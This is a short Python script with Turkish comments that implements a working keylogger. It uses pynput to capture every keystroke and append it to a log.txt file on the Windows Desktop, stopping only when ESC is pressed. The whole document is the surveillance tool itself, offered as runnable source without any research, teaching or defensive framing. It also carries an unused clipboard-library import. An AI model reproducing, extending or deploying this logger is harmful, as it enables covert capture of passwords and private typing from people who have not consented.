from pynput import keyboard
import pyperclip
import os

desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
file_path = os.path.join(desktop_path, 'log.txt')


# Tuş basma işlevi
def on_press(key):
    try:
        with open(file_path, "a") as f:
            f.write(f'{key} basıldı\n')
    except AttributeError:
        if key == keyboard.Key.space:
            with open(file_path, "a") as f:
                f.write('  ')
        elif key == keyboard.Key.enter:
            with open(file_path, "a") as f:
                f.write('\n')
        else:
            with open(file_path, "a") as f:
                f.write(f'{key} basıldı\n')

# Tuş bırakma işlevi
def on_release(key):
    if key == keyboard.Key.esc:  # Programı sonlandırmak için ESC tuşuna basılabilir.
        return False

# Dinleyici oluştur
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
input("Programın kapanmaması için bir tuşa basın...")
